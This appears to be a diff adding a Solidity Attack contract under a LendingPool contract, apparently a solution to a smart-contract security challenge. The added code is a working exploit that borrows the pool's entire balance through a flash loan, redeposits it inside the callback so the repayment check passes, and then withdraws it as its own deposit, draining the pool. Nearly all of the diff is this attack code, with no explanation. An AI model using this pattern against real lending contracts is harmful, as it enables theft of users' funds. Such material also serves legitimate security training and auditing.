@@ -38,3 +38,20 @@ contract LendingPool {
         require(address(this).balance >= balanceBefore, "Flashloan not paid back");
     }
 }
+
+
+contract Attack {
+    function attack(LendingPool instance) external {
+        instance.flashLoan(address(instance).balance);
+    }
+
+    function execute() public payable {
+        LendingPool(msg.sender).deposit{value:msg.value}();
+    }
+
+    function withdraw(LendingPool instance) public {
+        instance.withdraw();
+    }
+
+    receive() external payable {}
+}
